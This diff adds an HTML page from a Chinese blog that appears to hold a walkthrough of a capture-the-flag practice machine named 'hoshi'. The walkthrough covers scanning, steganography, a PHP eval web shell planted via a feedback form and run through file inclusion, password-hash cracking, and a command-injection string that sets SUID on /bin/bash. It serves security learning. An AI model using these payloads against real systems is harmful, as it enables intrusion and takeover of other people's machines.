@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 一、信息收集
+
+## 1. 主机发现
+
+首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。">
+<meta property="og:title" content="内部_hoshi">
+<meta property="og:description" content="# 一、信息收集
+
+## 1. 主机发现
+
+首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_hoshi.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_hoshi</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_hoshi</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/204" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
+<h2>1. 主机发现</h2>
+<p>首先，使用 <code class="notranslate">arp-scan</code> 在 <code class="notranslate">192.168.205.0/24</code> 网段中发现目标主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.142 08:00:27:24:64:43       PCS Systemtechnik GmbH
+...</pre></div>
+<p>确认目标主机IP地址为 <code class="notranslate">192.168.205.142</code>。</p>
+<h2>2. 端口扫描</h2>
+<p>使用 <code class="notranslate">nmap</code> 对目标主机进行全端口扫描，识别开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p- 192.168.205.142
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+...</pre></div>
+<p>扫描结果显示开放了 <strong>22 (SSH)</strong> 和 <strong>80 (HTTP)</strong> 两个端口。我们将Web服务作为主要的攻击入口。</p>
+<h2>3. Web目录与文件发现</h2>
+<p>访问 <code class="notranslate">http://192.168.205.142</code> 是一个“星际商城”的商品反馈页面。使用 <code class="notranslate">dirsearch</code> 进行目录爆破，发现多个关键文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -u http://192.168.205.142
+...
+[09:26:07] 200 -    1KB - /admin.php
+[09:26:16] 200 -   23KB - /info.php
+[09:26:22] 200 -  109B  - /robots.txt
+[09:26:25] 301 -  320B  - /uploads  -<span class="pl-k">&gt;</span>  http://192.168.205.142/uploads/
+...</pre></div>
+<p>主要发现：</p>
+<ul>
+<li><code class="notranslate">/admin.php</code>: 后台登录页面。</li>
+<li><code class="notranslate">/info.php</code>: 一个 <code class="notranslate">phpinfo()</code> 页面，泄露了详细的PHP配置。</li>
+<li><code class="notranslate">/uploads/</code>: 一个开放目录浏览的上传目录。</li>
+<li><code class="notranslate">/robots.txt</code>: 存在有趣的信息。</li>
+</ul>
+<h2>4. 信息泄露</h2>
+<p>查看 <code class="notranslate">robots.txt</code> 文件内容，发现一条重要线索。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.142/robots.txt
+本站的 logo 灵感来自 https://maze-sec.com/special/1/，但我们给它添了点特别的‘味道’！</pre></div>
+<p>该线索暗示网站的logo图片 <code class="notranslate">QQ.png</code> 可能被修改过，含有隐藏信息。</p>
+<h1>二、Web渗透与立足点</h1>
+<h2>1. 后台登录</h2>
+<p>访问 <code class="notranslate">/admin.php</code> 是一个管理员登录页面，只需要输入密码。根据主页页脚的客服热线 <code class="notranslate">400-123-4567</code>，尝试以此作为密码进行登录，成功进入后台。</p>
+<h2>2. 图像隐写 (盲水印)</h2>
+<p>根据 <code class="notranslate">robots.txt</code> 的提示，我们怀疑logo图片存在隐写。</p>
+<ol>
+<li>
+<p>分别下载目标网站的logo和原始logo。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">wget http://192.168.205.142/QQ.png -O target_logo.png
+wget https://maze-sec.com/img/QQ.png -O original_logo.png</pre></div>
+</li>
+<li>
+<p>常规的隐写分析工具均未发现异常。考虑到“味道”这种描述，推测可能是盲水印（Blind Watermark）。</p>
+</li>
+<li>
+<p>使用盲水印工具进行解密，成功提取出隐藏的水印信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 克隆工具</span>
+git clone https://github.com/chishaxie/BlindWaterMark.git
+<span class="pl-c1">cd</span> BlindWaterMark
+
+<span class="pl-c"><span class="pl-c">#</span> 解码</span>
+python bwmforpy3.py decode target_logo.png original_logo.png wm_extracted.png</pre></div>
+</li>
+<li>
+<p>查看提取出的水印图片 <code class="notranslate">wm_extracted.png</code>，得到隐藏的目录路径：<code class="notranslate">/hoshi/</code>。</p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/67b87db9073243fbad5dd122c4ef32a1210da08620b72e119abb0bd6d891beeb/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303831303232303731393834362e77656270"><img src="https://camo.githubusercontent.com/67b87db9073243fbad5dd122c4ef32a1210da08620b72e119abb0bd6d891beeb/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303831303232303731393834362e77656270" alt="提取出的水印" data-canonical-src="http://7r1UMPHK.github.io/image/20250810220719846.webp" style="max-width: 100%;"></a></p>
+<h2>3. 文件包含与Getshell</h2>
+<ol>
+<li>
+<p>访问新发现的路径 <code class="notranslate">http://192.168.205.142/hoshi/</code>，发现一个文件 <code class="notranslate">gift.php</code>。直接访问该文件返回错误“非法文件名”，这是典型的**文件包含（LFI）**漏洞特征。</p>
+</li>
+<li>
+<p>通过Fuzz工具 <code class="notranslate">ffuf</code> 爆破参数，确定用于文件包含的参数为 <code class="notranslate">file</code>。</p>
+</li>
+<li>
+<p>在 <code class="notranslate">admin.php</code> 页面源码中，发现一行隐藏的注释：<code class="notranslate">&lt;div style="display:none" id="static-tip"&gt;[debug] 静态页面已生成&lt;/div&gt;</code>。</p>
+</li>
+<li>
+<p><strong>攻击链梳理</strong>：</p>
+<ul>
+<li>在主页 <code class="notranslate">/index.php</code> 的反馈表单中提交PHP Web Shell。</li>
+<li>登录后台 <code class="notranslate">/admin.php</code>。这个登录行为会触发服务器将在后台生成一个包含所有反馈内容的静态文件 <code class="notranslate">admin.html</code>。（通过目录爆破发现）</li>
+<li>利用 <code class="notranslate">gift.php</code> 的文件包含漏洞去读取这个新生成的 <code class="notranslate">admin.html</code>。由于该文件是被PHP引擎包含的，其中的PHP代码将会被执行。</li>
+</ul>
+</li>
+<li>
+<p><strong>操作步骤</strong>:</p>
+<ul>
+<li>
+<p><strong>步骤一：注入Payload</strong>。在主页的反馈表单中的"您的昵称"输入栏提交以下内容。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span> <span class="pl-en">eval</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">'<span class="pl-s">ant</span>'</span>]); <span class="pl-ent">?&gt;</span></pre></div>
+</li>
+<li>
+<p><strong>步骤二：触发生成</strong>。访问 <code class="notranslate">/admin.php</code> 并使用密码 <code class="notranslate">400-123-4567</code> 登录。此时，包含我们Payload的 <code class="notranslate">admin.html</code> 文件已经在Web根目录生成。</p>
+</li>
+<li>
+<p><strong>步骤三：构造LFI URL</strong>。<code class="notranslate">http://192.168.205.142/hoshi/gift.php?file=admin.html</code></p>
+</li>
+<li>
+<p><strong>步骤四：连接Shell</strong>。使用蚁剑（AntSword）连接上述URL，密码为 <code class="notranslate">ant</code>，成功获得 <code class="notranslate">www-data</code> 用户的Web Shell。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1>三、权限提升</h1>
+<h2>1. 横向移动 (www-data -&gt; welcome)</h2>
+<ol>
+<li>
+<p>在 <code class="notranslate">www-data</code> shell中，使用 <code class="notranslate">linpeas.sh</code> 等脚本进行信息收集。在 <code class="notranslate">/var/backups/</code> 目录下发现一个可读的敏感文件 <code class="notranslate">shadow~</code>。</p>
+</li>
+<li>
+<p>读取该文件，获得 <code class="notranslate">root</code> 和 <code class="notranslate">welcome</code> 用户的密码哈希。</p>
+</li>
+<li>
+<p>使用 <code class="notranslate">John the Ripper</code> 和 <code class="notranslate">rockyou.txt</code> 字典对哈希进行破解，得到 <code class="notranslate">welcome</code> 用户的密码为 <code class="notranslate">loveme2</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ john --wordlist=rockyou.txt hash.txt
+...
+loveme2          (welcome)     
+...</pre></div>
+</li>
+<li>
+<p>使用 <code class="notranslate">su</code> 命令和破解出的密码成功切换到 <code class="notranslate">welcome</code> 用户。</p>
+</li>
+</ol>
+<h2>2. 提权至root (welcome -&gt; root)</h2>
+<ol>
+<li>
+<p>在 <code class="notranslate">welcome</code> 用户下，使用 <code class="notranslate">sudo -l</code> 检查其sudo权限，发现可以无密码以root权限执行一个Python脚本 <code class="notranslate">/root/12345.py</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@hoshi:/tmp$ sudo -l
+...
+User welcome may run the following commands on hoshi:
+    (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py</pre></div>
+</li>
+<li>
+<p>执行该脚本，它会在 <code class="notranslate">12345</code> 端口上开启一个自定义的配置shell。</p>
+</li>
+<li>
+<p>在Kali攻击机上，使用 <code class="notranslate">ncat</code> 连接该服务。通过 <code class="notranslate">help</code> 命令发现 <code class="notranslate">exec_cmd</code> 指令。测试发现 <code class="notranslate">|;&amp;&lt;&gt;</code> 等字符被过滤，但 <code class="notranslate">&amp;&amp;</code> 可用于命令拼接。</p>
+</li>
+<li>
+<p>利用命令注入，为 <code class="notranslate">/bin/bash</code> 添加SUID权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">conf<span class="pl-k">&gt;</span> exec_cmd id<span class="pl-s"><span class="pl-pds">'</span>&amp;&amp;chmod +s /bin/bash&amp;&amp;<span class="pl-pds">'</span></span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+</li>
+<li>
+<p>回到靶机shell，执行 <code class="notranslate">bash -p</code>，成功获得root权限的shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@hoshi:/opt$ bash -p
+bash-5.0# id
+uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)</pre></div>
+</li>
+</ol>
+<h1>四、获取Flag</h1>
+<p>现在拥有了root权限，可以读取所有的Flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash-5.0# cat /root/root.txt
+flag{root-5de923e57adefd6a1fd53a6705ad6486}
+
+bash-5.0# cat /home/welcome/user.txt
+flag{user-73b671a5f913d849d405784a428288dd}</pre></div>
+<p>所有Flag均已找到，渗透测试完成。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
